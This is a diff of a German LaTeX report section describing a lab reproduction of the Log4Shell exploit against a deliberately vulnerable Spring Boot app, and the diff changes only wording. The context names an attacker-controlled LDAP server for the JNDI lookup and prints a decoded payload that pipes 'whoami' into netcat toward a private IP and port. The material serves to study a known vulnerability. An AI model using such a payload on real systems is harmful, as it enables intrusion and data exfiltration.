@@ -2,7 +2,7 @@
 %! Date = 07.01.23
 
 \subsubsection{Versuchsaufbau und Exploit}
-Da die Log4j Bibliothek bereits gepatcht ist und auch sämtliche Java Versionen bereits gepatcht wurden, wurde im Versuchsaufbau ein Git Repository verwendet.\footcite{log4jvulnerableapp}
+Da die Log4j Bibliothek bereits gepatcht ist und auch betroffene Java Versionen bereits entfernt wurden, wurde im Versuchsaufbau ein Git Repository verwendet.\footcite{log4jvulnerableapp}
 Es beinhaltet eine Java Spring Boot Web Applikation, die mit einer Java Version läuft, die nach wie vor anfällig für Log4Shell Angriffe ist.
 
 Des Weiteren benötigt man einen \gls{ldap}-Server, den man selbst kontrolliert, um einen \gls{jndi}-Lookup zu provozieren.
@@ -19,7 +19,7 @@ Bei der Durchführung des Exploits wurde die Base64 Funktionalität des bereits 
 Daher liegt das auszuführende Skript als base64-encoded String vor.
 Die \gls{bash} Befehle, die hier der Reihe nach ausgeführt werden, sind übersetzt: \textit{bin/bash | whoami | nc 192.168.186.216 9999}.
 
-Die tatsächliche Funktionalität des Skripts konnte jedoch hierbei nicht Reverse-engineert werden.
+Die tatsächliche Funktionalität des Skripts konnte jedoch hierbei nicht \textit{Reverse-Engineered} werden.
 Ein eigener Ansatz einer solchen Base64 Funktionalität wäre der Folgende:
 \input{listings/Log4j-malware}
 
